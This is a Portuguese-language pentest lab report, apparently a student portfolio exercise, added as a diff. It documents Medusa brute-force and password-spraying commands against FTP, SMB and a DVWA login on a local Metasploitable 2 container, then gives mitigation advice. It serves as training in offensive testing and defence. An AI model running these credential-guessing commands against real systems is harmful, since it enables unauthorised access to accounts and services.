@@ -1,0 +1,44 @@
+==========================================================
+PROJETO PRÁTICO DIO: PENTEST COM KALI LINUX E MEDUSA
+==========================================================
+
+1. AMBIENTE DE EXECUÇÃO:
+----------------------------------------------------------
+- Atacante: Kali Linux (WSL2)
+- Alvo: Metasploitable 2 (Docker Container)
+- Ferramenta Principal: Medusa (v2.2+)
+
+2. CONFIGURAÇÃO DO ALVO (DOCKER):
+----------------------------------------------------------
+Comando: sudo docker run -d --name alvo-metasploitable -p 21:21 -p 80:80 -p 445:445 tleemcjr/metasploitable2
+
+3. WORDLISTS UTILIZADAS:
+----------------------------------------------------------
+- Usuários: users.txt (admin, root, msfadmin, user)
+- Senhas: passwords.txt (123456, password, msfadmin, qwerty)
+
+4. COMANDOS DE ATAQUE EXECUTADOS:
+----------------------------------------------------------
+[CENÁRIO FTP]:
+medusa -h 127.0.0.1 -u msfadmin -P passwords.txt -M ftp
+
+[CENÁRIO SMB (Password Spraying)]:
+medusa -h 127.0.0.1 -U users.txt -p msfadmin -M smbnt
+
+[CENÁRIO WEB (DVWA)]:
+medusa -h 127.0.0.1 -u admin -P passwords.txt -M web-form -m FORM:"dvwa/login.php" -m DENY-SIGNAL:"login failed"
+
+5. RESULTADOS E VALIDAÇÃO:
+----------------------------------------------------------
+- Sucesso na captura de credenciais no serviço FTP (msfadmin:msfadmin).
+- Identificação de enumeração de usuários via SMB.
+
+6. RECOMENDAÇÕES DE MITIGAÇÃO:
+----------------------------------------------------------
+- Implementação de Fail2Ban para bloqueio de IPs.
+- Desativação de serviços legados (FTP).
+- Uso de Políticas de Senhas Fortes e MFA.
+
+==========================================================
+Documentação gerada para o portfólio DIO - 2024
+==========================================================
